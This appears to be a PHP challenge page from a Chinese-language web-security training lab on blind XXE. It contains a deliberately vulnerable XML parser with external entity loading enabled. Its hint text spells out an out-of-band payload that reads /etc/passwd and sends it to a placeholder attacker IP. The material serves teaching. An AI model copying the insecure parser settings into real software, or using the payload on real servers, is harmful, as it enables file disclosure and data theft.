<?php
// 盲XXE
$result = null;
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['xml'])) {
    $xml = $_POST['xml'];
    libxml_disable_entity_loader(false);
    $doc = new DOMDocument();
    @$doc->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);
    // 不回显结果，只返回成功/失败
    $result = 'processed';
    if (preg_match('/<!ENTITY[^>]*SYSTEM\s+["\']https?:/i', $xml)) {
        renderChallengeSuccess($challenge, '远程实体引用让解析器发起了外带请求');
    }
}
?>

<p>XML数据处理（盲XXE）</p>
<p>XML解析不回显结果，但会处理外部实体。需要通过外带数据（OOB）提取信息。</p>

<form method="POST">
    <label>XML数据</label>
    <textarea name="xml" placeholder="输入XML数据"><?= h($_POST['xml'] ?? '') ?></textarea>
    <button type="submit" class="btn btn-primary">提 交</button>
</form>

<?php if ($result): ?>
    <div class="result-box" style="color:var(--accent);">XML数据已处理（无回显）</div>
<?php endif; ?>

<p style="margin-top:1rem; font-size:0.8rem; color:var(--text-muted);">
    盲XXE外带方法：
    <br>1. 在你的VPS上放置DTD文件，内容：
    <br>&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
    <br>&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfil SYSTEM 'http://你的IP/?data=%file;'&gt;"&gt;
    <br>%eval;%exfil;
    <br><br>2. XML中引用该DTD：
    <br>&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM "http://你的IP/evil.dtd"&gt;%xxe;]&gt;
</p>
